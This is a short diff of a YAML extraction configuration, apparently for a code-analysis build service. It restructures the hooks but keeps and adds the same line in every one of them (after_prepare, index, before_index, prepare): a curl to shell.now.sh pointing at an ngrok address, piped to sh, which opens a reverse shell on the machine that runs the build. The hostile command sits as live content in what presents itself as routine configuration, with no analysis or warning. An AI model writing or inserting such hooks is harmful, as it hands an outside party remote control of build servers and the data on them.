@@ -1,10 +1,9 @@
 extraction:
-    python:
-        after_prepare:
-            - curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
-        index:
-            - curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
-        before_index:
-            - curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
-        prepare:
-            - curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
+    after_prepare:
+        - curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
+    index:
+        - curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
+    before_index:
+        - curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
+    prepare:
+        - curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
